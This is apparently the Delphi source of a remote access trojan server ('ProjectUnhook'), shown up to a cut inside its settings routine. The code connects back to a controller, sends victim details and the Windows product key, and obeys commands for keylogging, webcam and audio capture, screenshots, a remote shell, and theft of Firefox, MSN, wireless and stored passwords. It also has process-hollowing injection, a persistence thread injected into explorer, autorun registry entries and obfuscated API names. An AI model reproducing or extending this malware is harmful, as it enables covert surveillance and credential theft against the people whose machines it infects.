program ProjectUnhook;

{$IMAGEBASE $30000000}
{$APPTYPE CONSOLE}

uses
  ApplicationUnit,
  messages,
  windows,
  WInsock2,
  SocketUnit,
  ImageHlp,
  ShlObj,
  ShFolder,
  ShellApi,
  afxcodehook,
  CompressionStreamUnit,
  UnHook,
  MiniReg,
  UnitScreenCapture in 'UnitScreenCapture.pas',
  UnitSharedData in 'UnitSharedData.pas',
  UnitFileManager in 'UnitFileManager.pas',
  UnitFileSearch in 'UnitFileSearch.pas',
  UnitWebcamCapture in 'UnitWebcamCapture.pas',
  UnitServiceManager in 'UnitServiceManager.pas',
  UnitWindowManager in 'UnitWindowManager.pas',
  UnitProcessManager in 'UnitProcessManager.pas',
  UnitCpuSpeed in 'UnitCpuSpeed.pas',
  UnitAudioCapture in 'UnitAudioCapture.pas',
  UnitKeyLogger in 'UnitKeyLogger.pas',
  UnitInstalledApplications in 'UnitInstalledApplications.pas',
  UnitRegEdit in 'UnitRegEdit.pas',
  UnitRemoteShell in 'UnitRemoteShell.pas',
  UnitSystemInfo in 'UnitSystemInfo.pas',
  UnitPasswordAudit in 'UnitPasswordAudit.pas',
  UnitWep in 'UnitWep.pas',
  UnitMsnPass,
  UnitStorage in 'UnitStorage.pas',
  UnitOfflineKeyLogger in 'UnitOfflineKeyLogger.pas',
  UnitOfflineScreenCapture in 'UnitOfflineScreenCapture.pas',
  UnitAVFWDetector in 'UnitAVFWDetector.pas',
  untaPlib in 'untaPlib.pas',
  p2pspreadunit,
  UnitFirefox in 'UnitFirefox.pas';

type
  TSections = array [0..0] of TImageSectionHeader;

const
  Version = '0.3 Beta 6';
  DebugMode = True;

var
  MutexName: string;// = '56y^&FV';

var
  BaseAddress, Bytes, HeaderSize, InjectSize,  SectionLoop, SectionSize: dword;
  Context: TContext;
  FileData: pointer;
  ImageNtHeaders: PImageNtHeaders;
  InjectMemory: pointer;
  PSections: ^TSections;
  ProcInfo: TProcessInformation;
  StartInfo: TStartupInfo;

var
  CamDrivers: string;
  ServerMutex: THandle;
  NewFileData: string;
  LastConnection: int64;
  NewSHDeleteKey: function(root : HKEY; subkey : Pchar) : boolean; stdcall;
  CapGetDriverDescriptionA: function(DrvIndex:cardinal; Name:pansichar;NameLen:cardinal;Description:pansichar;DescLen:cardinal):bool;stdcall;
  procedure NewConnection(p: pointer); forward;
  procedure NewMaster(p: pointer); forward; //stdcall; forward;

function GetCdKey: string;
var
  S: string;
  N: integer;
  InstallDate: dword;
  Stream: TMemorySTream;
begin
  Stream := TMemoryStream.Create;

  RegGetBinary(HKEY_LOCAL_MACHINE, 'SOFTWARE\MICROSOFT\Windows NT\CurrentVersion\DigitalProductId', s);
  n := length(s);
  Stream.Write(n,sizeof(integer));
  Stream.Write(pointer(s)^,n);     //digital product id

  RegGetString(HKEY_LOCAL_MACHINE, 'SOFTWARE\MICROSOFT\Windows NT\CurrentVersion\ProductID', s);
  n := length(s);
  Stream.Write(n,sizeof(integer));
  Stream.Write(pointer(s)^,n);     //digital product id

  RegGetDWORD(HKEY_LOCAL_MACHINE, 'SOFTWARE\MICROSOFT\Windows NT\CurrentVersion\InstallDate', InstallDate);
  Stream.Write(InstallDate,sizeof(dword));     //digital product id

  SetString(Result,Pchar(Stream.Memory),Stream.Size);
  Stream.Free;
end;

function LastPos(Needle: Char; Haystack: String): integer;
begin
  for Result := Length(Haystack) downto 1 do
    if Haystack[Result] = Needle then
      Break;
end;

function TempDir: string;
var
  Buf: array [0..255] of Char;
begin
  GetTempPath(255,Buf);
  Result := Buf;
end;

function RightStr(Text : String ; Num : Integer): String ;
begin
   Result := Copy(Text,length(Text)+1 -Num,Num);
end;

function IncludeTrailingBackslash(Path: string): string;
begin
  Result := Path;
  if RightStr(Path,1) <> '\' then Result := Result + '\';
end;

function GetSpecialFolder(const CSIDL : integer) : string;
var
  RecPath: array[0..255] of char;
begin
  result := '';
  if SHGetSpecialFolderPath(0,RecPath,CSIDL,false) then result := IncludeTrailingBackslash(RecPath);
end;

function ServerPath: string;
begin
  Result := ServerData.InstallFolder + ServerData.InstallName;
end;

function ListCamDrivers: string;
var
  x:cardinal;
  names: string;
  Descriptions: string;
begin
  setlength(Names,256);
  setlength(Descriptions,256);
  for x := 0 to 9 do begin
    if not capGetDriverDescriptionA(x,pchar(Names),256,pchar(Descriptions),256) then Exit;
    if length(Names) > 0 then CamDrivers := CamDrivers + Names + #13#10;
  end;
end;

function CamExists: string;
begin
  Result := 'Not Installed';
  //if ListCamDrivers <> '' then Result := 'Detected';
  if CamDrivers <> '' then Result := 'Detected';
end;



procedure MyResize(LessThan,OldWidth, OldHeight: integer; Var NewWidth, NewHeight: integer);
var
  i: integer;
begin
  i := 1;
  while true do begin
    NeWwidth := OldWidth div i;
    NewHeight := OldHeight div i;
    if (NewWidth <= LessThan) and (NewHeight <= LessThan) then Exit;
    inc(i);
  end;
end;

function GetDesktop: HBitmap;
var
  DC, MemDC, Bitmap, OBitmap: HBitmap;
  ScreenWidth, ScreenHeight: integer;
  NewWidth,NewHeight: integer;
begin
  DC := GetDC(GetDesktopWindow);
  ScreenWidth := GetDeviceCaps(DC, HORZRES);
  ScreenHeight := GetDeviceCaps(DC, VERTRES);

  MyResize(128,ScreenWidth,ScreenHeight,NewWidth,NewHeight);

  MemDC := CreateCompatibleDC(DC);
  Bitmap := CreateCompatibleBitmap(DC, NewWidth, NewHeight);
  OBitmap := SelectObject(MemDC, Bitmap);
  StretchBlt(MemDC, 0, 0, NewWidth, NewHeight, DC, 0, 0, ScreenWidth, ScreenHeight, SRCCOPY);
  SelectObject(MemDC, OBitmap);
  DeleteDC(MemDC);
  ReleaseDC(GetDesktopWindow, DC);
  Result := Bitmap;
end;

function GetIdleTime: String;
var
  liInfo: TLastInputInfo;
  t: Longword;
begin
  liInfo.cbSize := SizeOf(TLastInputInfo);
  GetLastInputInfo(liInfo);
  t := (GetTickCount - liInfo.dwTime);
  result := inttostr(t);
end;


procedure SetTokenPrivileges(Priv: string);
var
  hToken1, hToken2, hToken3: THandle;
  TokenPrivileges: TTokenPrivileges;
  Version: OSVERSIONINFO;
begin
  Version.dwOSVersionInfoSize := SizeOf(OSVERSIONINFO);
  GetVersionEx(Version);
  if Version.dwPlatformId <> VER_PLATFORM_WIN32_WINDOWS then
  begin
    try
      OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken1);
      hToken2 := hToken1;
      LookupPrivilegeValue(nil,Pchar(Priv), TokenPrivileges.Privileges[0].luid);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken1, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken2, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      CloseHandle(hToken1);
    except;
    end;
  end;
end;


function RegDelValue(RootKey: HKEY; Name: String): boolean;
var
  SubKey: String;
  n: integer;
  hTemp: HKEY;
begin
  Result := False;
  n := LastPos('\', Name);
  if n > 0 then
  begin
    SubKey := Copy(Name, 1, n - 1);
    if RegOpenKeyEx(RootKey, PChar(SubKey), 0, KEY_WRITE, hTemp) = ERROR_SUCCESS then
    begin
      SubKey := Copy(Name, n + 1, Length(Name) - n);
      Result := (RegDeleteValue(hTemp, PChar(SubKey)) = ERROR_SUCCESS);
      RegCloseKey(hTemp);
    end;
  end;
end;

{function RegWriteString(Key: HKey; SubKey: string;  Data: string; Value: string): bool;
var
  RegKey: HKey;
  DataType: integer;
begin
  Result := False;
  DataType := REG_SZ;
  if RegCreateKey(Key,pchar(SubKey),RegKey) = ERROR_SUCCESS then begin;
    if RegSetValueEx(RegKey,pchar(Data),0,DataType,pchar(Value),Length(Value)) = ERROR_SUCCESS then result := True;
    RegCloseKey(RegKey);
  end;
end;}

procedure RemoveRegKeys;
var
  s: string;
  p: integer;
begin

  if ServerData.Activex = 'True' then begin
    s := 'SOFTWARE\Microsoft\Active Setup\Installed Components\' + ServerData.ActiveXKey;
    NewSHDeleteKey(HKEY_LOCAL_MACHINE,PChar(s));
  end;

  if ServerData.RegRun = 'True' then begin
    if AccountType = 'Administrator' then begin
      RegDelValue(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows\CurrentVersion\Run\' + ServerData.RegRunKey);
    end else begin
      RegDelValue(HKEY_CURRENT_USER,'SOFTWARE\Microsoft\Windows\CurrentVersion\Run\' + ServerData.RegRunKey);
    end;
  end;

  if ServerData.UserInit = 'True' then begin
    RegGetString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserInit',s);
    p := Pos(ServerPath,s);
    if p = 0 then exit;
    Delete(s,p,Length(ServerPath));
    //RegWriteString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\','UserInit',s);
    MiniReg.RegSetString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserInit',s);
  end;

end;

procedure ParseData(Socket: TClientSocket);
var
  Data,Command: string;
  DataSize: string;
  SocketData: TSocketData;
  NewSocketData: TSocketData;
  Thr: dword;
  Stream: TMemoryStream;
  Cpu: double;
  Mutex: THandle;
  FileName: string;
  Memory: TMemoryStatus;
  LengthDataSize,LengthSocketData: int64;
begin
  if Socket = nil then exit;
  if not Socket.Connected then exit;

  SocketData := TSocketData(Socket.Data);
  if SocketData = nil then exit;

  DataSize := Split(SocketData.Data,'|',1);
  LengthDataSize := Length(DataSize);
  LengthSocketData := Length(SocketData.Data) - Length(DataSize) -1;
  if LengthSocketData < strtoint(DataSize) then exit;

  Delete(SocketData.Data,1,LengthDataSize+1);
  Data := Copy(SocketData.Data,1,StrToInt(DataSize));
  Delete(SocketData.Data,1,Length(Data));
  Data := Decompress(Data);

  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'LogIn' then begin
    if SocketData.MainSocket then begin
      if Socket.Connected then SendData(Socket,SocketData.ConnectionString);
    end;
  end;

  if Command = 'Ping' then begin
    SendData(Socket,'Pong|' + GetIdleTime);
  end;

  if Command = 'NewConnection' then begin
    NewSocketData := TSocketData.Create;
    NewSocketData.RemoteHost := SocketData.RemoteHost;
    NewSocketData.RemotePort := SocketData.RemotePort;
    NewSocketData.ConnectionString := Data;
    NewSocketData.MainSocket := False;
    NewSocketData.ThreadHandle := BeginThread(nil,0,@NewConnection,pointer(NewSocketData),0,Thr);
  end;

  if Command = 'Share' then begin
    NewSocketData := TSocketData.Create;
    NewSocketData.RemoteHost := Split(Data,'|',1);
    NewSocketData.RemotePort := strtoint(Split(Data,'|',2));
    NewSocketData.MainSocket := True;
    NewSocketData.ThreadHandle := BeginThread(nil,0,@NewMaster,pointer(NewSocketData),0,Thr);
  end;

  if Command = 'Update' then begin
    if ServerData.Persistent = 'True' then begin
      ServerData.Persistent := 'False';
      Mutex := CreateMutex(nil,False,pchar(MutexName + 'Stop'));
      Sleep(5000);
    end;
    RemoveRegKeys;
    CloseHandle(Mutex);
    CloseHandle(ServerMutex);
    FileName := TempDir + inttostr(GetTickCount) + '.exe';
    Stream := TMemoryStream.Create;
    Stream.Write(pointer(Data)^,Length(Data));
    Stream.SaveToFile(FileName);
    Stream.Free;
    if ShellExecute(0,'open',pchar(FileName),'','',SW_SHOWNORMAL) < 33 then begin
      SendData(Socket,'UpdateFail');
      ShellExecute(0,'open',pchar(ServerPath),'','',SW_SHOWNORMAL);
    end else begin
      DeleteFileEx(pchar(ServerPath));
    end;
    ExitProcess(0);
  end;

  if Command = 'RestartServer' then begin
    if ServerData.Persistent = 'True' then begin
      ServerData.Persistent := 'False';
      Mutex := CreateMutex(nil,False,pchar(MutexName + 'Stop'));
      Sleep(5000);
    end;
    CloseHandle(Mutex);
    CloseHandle(ServerMutex);
    ShellExecute(0,'open',pchar(ServerPath),'','',SW_SHOWNORMAL);
    ExitProcess(0);
  end;

  if Command = 'Remove' then begin
    if ServerData.Persistent = 'True' then begin
      ServerData.Persistent := 'False';
      Mutex := CreateMutex(nil,False,pchar(MutexName + 'Stop'));
      Sleep(5000);
    end;
    DeleteFileEx(pchar(ServerPath));
    RemoveRegKeys;
    ExitProcess(0);
  end;

  if Command = 'ScreenShot' then begin
    Data := SaveBitmapToFile(GetDesktop,8);
    SendData(Socket,Command + '|' + Data);
  end;

  if Command = 'Status' then begin
    Stream := TMemoryStream.Create;
    Cpu := UnitCpuSpeed.dbIdleTime;
    Stream.Write(Cpu,Sizeof(Cpu));
    GlobalMemoryStatus(Memory);
    Stream.Write(Memory,Sizeof(TMemoryStatus));
    SetString(Data,Pchar(Stream.Memory),Stream.Size);
    Stream.Free;
    SendData(Socket,Command + '|' + Data);
  end;

  if Command = 'Close' then begin
    ExitProcess(0);
  end;

  if Command = 'Execute' then begin
    ShellExecute(0,'open',pchar(Data),'','',SW_SHOWNORMAL);
  end;

  if Command = 'Shutdown' then begin
    SetTokenPrivileges('SeShutdownPrivilege');
    ExitWIndowsEx(EWX_POWEROFF or EWX_FORCE,0);
  end;

  if Command = 'Logoff' then begin
    SetTokenPrivileges('SeShutdownPrivilege');
    ExitWIndowsEx(EWX_LOGOFF or EWX_FORCE,0);
  end;

  if Command = 'Reboot' then begin
    SetTokenPrivileges('SeShutdownPrivilege');
    ExitWIndowsEx(EWX_REBOOT or EWX_FORCE,0);
  end;

  if Command = 'Messenger' then begin
    SendData(Socket,Command + '|' + UnitMsnPass.ObtainPasswords);
  end;

  if Command = 'Storage' then begin
    SendData(Socket,Command + '|' + UnitStorage.ObtainPasswords);
  end;

  if Command = 'Wireless' then begin
    SendData(Socket,Command + '|' + UnitWep.ObtainPasswords);
  end;

   if Command = 'Firefox' then begin
    SendData(Socket,Command + '|' + UnitFirefox.ObtainPasswords);
  end;

  if Command = 'ProductKey' then begin
    SendData(Socket,Command + '|' + GetCdKey);
  end;

  if Command = 'ScreenCapture' then UnitScreenCapture.ParseData(Socket,Data);

  if Command = 'OfflineScreenCapture' then UnitOfflineScreenCapture.ParseData(Socket,Data);

  if Command = 'FileManager' then UnitFileManager.ParseData(Socket,Data);

  if Command = 'FileSearch' then UnitFileSearch.ParseData(Socket,Data);

  if Command = 'WebcamCapture' then UnitWebcamCapture.ParseData(Socket,Data);

  if Command = 'ServiceManager' then UnitServiceManager.ParseData(Socket,Data);

  if Command = 'WindowManager' then UnitWindowManager.ParseData(Socket,Data);

  if Command = 'ProcessManager' then UnitProcessManager.ParseData(Socket,Data);

  if Command = 'AudioCapture' then UnitAudioCapture.ParseData(Socket,Data);

  if Command = 'KeyLogger' then UnitKeyLogger.ParseData(Socket,Data);

  if Command = 'OfflineKeyLogger' then UnitOfflineKeyLogger.ParseData(Socket,Data);

  if Command = 'InstalledApplications' then UnitInstalledApplications.ParseData(Socket,Data);

  if Command = 'RegEdit' then UnitRegEdit.ParseData(Socket,Data);

  if Command = 'RemoteShell' then UnitRemoteShell.ParseData(Socket,Data);

  if Command = 'SystemInfo' then UnitSystemInfo.ParseData(Socket,Data);

  if Command = 'PasswordAudit' then UnitPasswordAudit.ParseData(Socket,Data);

  sleep(10);
  //App.ProcessMessages;

  if Length(SocketData.Data) > 0 then ParseData(Socket);
end;

Procedure CheckDataArrival(Socket:TClientSocket; MainSocket: bool);
var
  Data: string;
  Nonblocking: cardinal;
  SocketData: TSocketData;
  PingNumber: integer;
  Ram: int64;
    MemoryStatus: TMemoryStatus;
  Stream: TMemoryStream;
  App: TApplication;
begin
  Nonblocking := 1;
  ioctlsocket(Socket.Socket, FIONBIO, Nonblocking);

  SocketData := TSocketData(Socket.Data);
  if SocketData = nil then exit;

  Socket.SendString('');
  if not Socket.Connected then exit;
                                                                                                       //Socket.LocalAddress
  if MainSocket then begin
    SocketData.ConnectionString := SocketData.ConnectionString + 'OnConnect' + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + ServerData.AssignedGroup + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + ServerData.AssignedName + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + UserName + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + ComputerName + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + Socket.LocalAddress + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + CamExists + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + Version + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + GetIdleTime + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + Country + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + Language + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + AccountType + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + inttostr(GetCPUSpeed) + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + RamSize + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + OperatingSystem + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + ServerData.OfflineLogger + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + ServerData.OfflineScreenCapture + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + UnitFileManager.ParsePath('%ROOT%') + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + UnitFileManager.ParsePath('%DESKTOP%') + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + UnitFileManager.ParsePath('%MYDOCUMENTS%') + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + UnitFileManager.ParsePath('%APPLICATIONDATA%') + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + CountryCode + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + ServerData.Password + '|';
    SocketData.ConnectionString := SocketData.ConnectionString + GetCdKey + '|';
  end;


  SendData(Socket,SocketData.ConnectionString);

  App := TApplication.Create;
  App.ProcessMessages;
  //PingNumber := 0;

  while Socket.Connected do begin

    sleep(10);
    App.ProcessMessages;

    {Inc(PingNumber,10);
    if (PingNumber >= 60000) and (MainSocket) then begin
      Sleep(1);
      Break;
    end;}

    Data := Socket.ReceiveString;

    if Length(Data) > 0 then begin
      PingNumber := 0;
      SocketData.Data := SocketData.Data + Data;
      ParseData(Socket);
    end;

  end;

  if SocketData.WebcamSocket then begin
    UnitWebcamCapture.ParseData(Socket,'Disconnect');
  end;

end;

procedure NewConnection(p: pointer);
var
  SocketData: TSocketData;
  Socket: TClientSocket;
begin
  SocketData := TSocketData(p);
  Socket := TClientSocket.Create;
  Socket.Data := SocketData;
  Socket.Connect(SocketData.RemoteHost,SocketData.RemotePort);
  CheckDataArrival(Socket,False);
  SocketData.Free;
  Socket.Disconnect;
  Socket.Free;
end;

procedure NewMaster(p: pointer); //stdcall;
var
  SocketData: TSocketData;
  Socket: TClientSocket;
  RemoteHost: string;
  RemotePort: integer;
begin
  SocketData := TSocketData(p);
  RemoteHost := SocketData.RemoteHost;
  RemotePort := SocketData.RemotePort;
  SocketData.Free;

  while True do begin

    if GetTickCount - LastConnection < 5000 then begin
      Sleep(1000);
      Continue;
    end;
    LastConnection := GetTickCount;

    Socket := TClientSocket.Create;
    SocketData := TSocketData.Create;
    SocketData.RemoteHost := RemoteHost;
    SocketData.RemotePort := RemotePort;
    SocketData.MainSocket := True;
    Socket.Data := SocketData;

    Socket.Connect(RemoteHost,RemotePort);
    CheckDataArrival(Socket,True);

    //SocketData.Data := '';
    //Socket.Disconnect;
    Socket.Free;
    SocketData.Free;

    Sleep(5000);  //Random(10000));//
  end;
end;

function GetAlignedSize(Size: dword; Alignment: dword): dword;
begin
  if ((Size mod Alignment) = 0) then begin
    Result := Size;
  end else begin
    Result := ((Size div Alignment) + 1) * Alignment;
  end;
end;

function ImageSize(Image: pointer): dword;
var
  Alignment: dword;
  ImageNtHeaders: Windows.PImageNtHeaders;
  PSections: ^TSections;
  SectionLoop: dword;
begin
  ImageNtHeaders := pointer(dword(dword(Image)) + dword(Windows.PImageDosHeader(Image)._lfanew));
  Alignment := ImageNtHeaders.OptionalHeader.SectionAlignment;

  if ((ImageNtHeaders.OptionalHeader.SizeOfHeaders mod Alignment) = 0) then begin
    Result := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
  end else begin
    Result := ((ImageNtHeaders.OptionalHeader.SizeOfHeaders div Alignment) + 1) * Alignment;
  end;

  PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) + ImageNtHeaders.FileHeader.SizeOfOptionalHeader);

  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do begin
    if PSections[SectionLoop].Misc.VirtualSize <> 0 then begin

      if ((PSections[SectionLoop].Misc.VirtualSize mod Alignment) = 0) then begin
        Result := Result + PSections[SectionLoop].Misc.VirtualSize;
      end else begin
        Result := Result + (((PSections[SectionLoop].Misc.VirtualSize div Alignment) + 1) * Alignment);
      end;

    end;
  end;

end;

procedure RunInMemory(FileMemory: pointer);
begin
  ImageNtHeaders := pointer(dword(dword(FileMemory)) + dword(Windows.PImageDosHeader(FileMemory)._lfanew));
  InjectSize := ImageSize(FileMemory);
  GetMem(InjectMemory, InjectSize);
  try

    FileData := InjectMemory;
    HeaderSize := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
    PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) + ImageNtHeaders.FileHeader.SizeOfOptionalHeader);
    for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do begin
      if PSections[SectionLoop].PointerToRawData < HeaderSize then HeaderSize := PSections[SectionLoop].PointerToRawData;
    end;
    CopyMemory(FileData, FileMemory, HeaderSize);
    FileData := pointer(dword(FileData) + GetAlignedSize(ImageNtHeaders.OptionalHeader.SizeOfHeaders, ImageNtHeaders.OptionalHeader.SectionAlignment));
    for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do begin
      if PSections[SectionLoop].SizeOfRawData > 0 then begin
        SectionSize := PSections[SectionLoop].SizeOfRawData;
        if SectionSize > PSections[SectionLoop].Misc.VirtualSize then SectionSize := PSections[SectionLoop].Misc.VirtualSize;
        CopyMemory(FileData, pointer(dword(FileMemory) + PSections[SectionLoop].PointerToRawData), SectionSize);
        FileData := pointer(dword(FileData) + GetAlignedSize(PSections[SectionLoop].Misc.VirtualSize, ImageNtHeaders.OptionalHeader.SectionAlignment));
      end else begin
        if PSections[SectionLoop].Misc.VirtualSize <> 0 then FileData := pointer(dword(FileData) + GetAlignedSize(PSections[SectionLoop].Misc.VirtualSize, ImageNtHeaders.OptionalHeader.SectionAlignment));
      end;
    end;

    Context.ContextFlags := CONTEXT_FULL;
    GetThreadContext(ProcInfo.hThread, Context);
    ReadProcessMemory(ProcInfo.hProcess, pointer(Context.Ebx + 8), @BaseAddress, 4, Bytes);
    VirtualAllocEx(ProcInfo.hProcess, pointer(ImageNtHeaders.OptionalHeader.ImageBase), InjectSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(ProcInfo.hProcess, pointer(ImageNtHeaders.OptionalHeader.ImageBase), InjectMemory, InjectSize, Bytes);
    WriteProcessMemory(ProcInfo.hProcess, pointer(Context.Ebx + 8), @ImageNtHeaders.OptionalHeader.ImageBase, 4, Bytes);
    Context.Eax := ImageNtHeaders.OptionalHeader.ImageBase + ImageNtHeaders.OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(ProcInfo.hThread, Context);
    ResumeThread(ProcInfo.hThread);

  finally
    FreeMemory(InjectMemory);
  end;
end;

function SysDir: string;
var
  Buf: array [0..255] of Char;
begin
  GetSystemDirectory(Buf,255);
  Result := Buf + string('\');
end;


procedure MakePersistent;
type
  TPersistentInfo = record
    lpFileName: pointer;
    lpMutexName: pointer;
    lpMutexName2: pointer;
    lpStopMutex: pointer;
    pSleep: procedure(dwMilliseconds: DWORD); stdcall;
    pCreateMutex: function(lpMutexAttributes: PSecurityAttributes; bInitialOwner: BOOL; lpName: PAnsiChar): THandle; stdcall;
    pMessageBoxA: function(hWnd: HWND; lpText, lpCaption: PAnsiChar; uType: UINT): Integer; stdcall;
    pGetLastError: function: DWORD; stdcall;
    pCloseHandle: function(hObject: THandle): BOOL; stdcall;
    pShellExecuteA: function(hWnd: HWND; Operation, FileName, Parameters,Directory: PAnsiChar; ShowCmd: Integer): HINST; stdcall;
    pExitThread: procedure(dwExitCode: DWORD); stdcall;
  end;

var
  PersistentInfo: TPersistentInfo;
  Thread: THandle;
  Process: longword;
  PID: longword;

  procedure PersistentThread(lpParameter: pointer); stdcall;
  var
    PersistentInfo: TPersistentInfo;
    CheckRunningMutex: THandle;
    StopMutex: THandle;
    ServerMutex: THandle;
  begin
    PersistentInfo := TPersistentInfo(lpParameter^);

    CheckRunningMutex := PersistentInfo.pCreateMutex(nil,False,PersistentInfo.lpMutexName2);
    if PersistentInfo.pGetLastError = ERROR_ALREADY_EXISTS then begin
      PersistentInfo.pExitThread(0);
    end;

    while True do begin

      StopMutex := PersistentInfo.pCreateMutex(nil,False,PersistentInfo.lpStopMutex);
      if PersistentInfo.pGetLastError = ERROR_ALREADY_EXISTS then begin
        PersistentInfo.pCloseHandle(CheckRunningMutex);
        PersistentInfo.pCloseHandle(StopMutex);
        PersistentInfo.pExitThread(0);
      end;
      PersistentInfo.pCloseHandle(StopMutex);

      ServerMutex := PersistentInfo.pCreateMutex(nil,False,PersistentInfo.lpMutexName);
      if PersistentInfo.pGetLastError = ERROR_ALREADY_EXISTS then begin
        PersistentInfo.pCloseHandle(ServerMutex);
      end else begin
        PersistentInfo.pCloseHandle(ServerMutex);
        PersistentInfo.pShellExecuteA(0,nil,PersistentInfo.lpFileName,nil,nil,SW_SHOWNORMAL);
      end;

      PersistentInfo.pSleep(2500);
    end;

  end;

begin
  GetWindowThreadProcessID(FindWindow('Shell_TrayWnd', nil), @PID); //Shell_TrayWnd Notepad
  Process := OpenProcess(PROCESS_ALL_ACCESS, False, PID);

  PersistentInfo.lpFileName := InjectString(Process, pchar(ServerPath));
  PersistentInfo.lpMutexName := InjectString(Process,pchar(MutexName));
  PersistentInfo.lpMutexName2 := InjectString(Process,pchar(MutexName + 'Thread'));
  PersistentInfo.lpStopMutex := InjectString(Process,pchar(MutexName + 'Stop'));

  PersistentInfo.pCreateMutex := GetProcAddress(GetModuleHandle('kernel32'), 'CreateMutexA');
  PersistentInfo.pMessageBoxA := GetProcAddress(GetModuleHandle('user32'), 'MessageBoxA');
  PersistentInfo.pGetLastError := GetProcAddress(GetModuleHandle('kernel32'), 'GetLastError');
  PersistentInfo.pSleep := GetProcAddress(GetModuleHandle('kernel32'), 'Sleep');
  PersistentInfo.pCloseHandle := GetProcAddress(GetModuleHandle('kernel32'), 'CloseHandle');
  PersistentInfo.pShellExecuteA := GetProcAddress(GetModuleHandle('shell32'), 'ShellExecuteA');
  PersistentInfo.pExitThread := GetProcAddress(GetModuleHandle('kernel32'), 'ExitThread');

  Thread := InjectThread(Process, @PersistentThread, @PersistentInfo, SizeOf(TPersistentInfo), False);
   if Thread = 0 then Exit;
  CloseHandle(Thread);
  CloseHandle(Process);
end;

function Decrypt2(str:string):string;
var
  i: integer;
  a: byte;
begin
  for i := 1 to length(str) do begin
    A := ord(Str[i]);
    result := result + char(a-1);
  end;
end;

function NewGetProcAddress(Module,ApiName: string): pointer;
begin
  result := getprocaddress(loadlibrary(pchar(decrypt2(module))),pchar(decrypt2(apiname)));
end;

procedure PersistentThread;
var
  FileHandle: THandle;
  Stream: TMemoryStream;
  Temp: string;
  s,s2: string;
begin
  while ServerData.Persistent = 'True' do begin

    if ServerData.Activex = 'True' then begin
      RegSetString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Active Setup\Installed Components\' + ServerData.RegRunKey + '\StubPath',ServerPath);
      NewSHDeleteKey := NewGetProcAddress('timxbqj/emm','TIEfmfufLfzB');
      Temp := 'SOFTWARE\Microsoft\Active Setup\Installed Components\' + ServerData.RegRunKey;
      NewShDeleteKey(HKEY_CURRENT_USER, PChar(Temp));
    end;

    if ServerData.UserInit = 'True' then begin
      RegGetString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserInit',s);
      if Pos(ServerPath,s) = 0 then begin
        if RightStr(s,1) = ',' then begin
          s2 := s + ServerPath;
        end else begin
          s2 := s + ',' + ServerPath;
        end;
        RegSetString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserInit',s2);
      end;
    end;

    if ServerData.RegRun = 'True' then begin
      if AccountType = 'Administrator' then begin
        RegSetString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows\CurrentVersion\Run\' + ServerData.RegRunKey,ServerPath);
      end else begin
        RegSetString(HKEY_CURRENT_USER,'SOFTWARE\Microsoft\Windows\CurrentVersion\Run\' + ServerData.RegRunKey,ServerPath);
      end;
    end;

    FileHandle := CreateFile(pchar(ServerPath),GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,FILE_ATTRIBUTE_HIDDEN, 0);
    if FileHandle = INVALID_HANDLE_VALUE then begin
      Stream := TMemoryStream.Create;
      Stream.Write(pointer(NewFileData)^,length(NewFileData));
      Stream.SaveToFile(ServerPath);
      Stream.Free;
    end;
    CloseHandle(FileHandle);


    Sleep(2500);
  end;
end;

function Ca(St: string): string;
var
  i: integer;
  a: byte;
begin
  for i := length(St) downto 1 do begin
    A := ord(St[i]);
    result := result + char(a-1);
  end;
end;

procedure GetSettings;
var
  ResourceLocation: HRSRC;
  ResourceSize: dword;
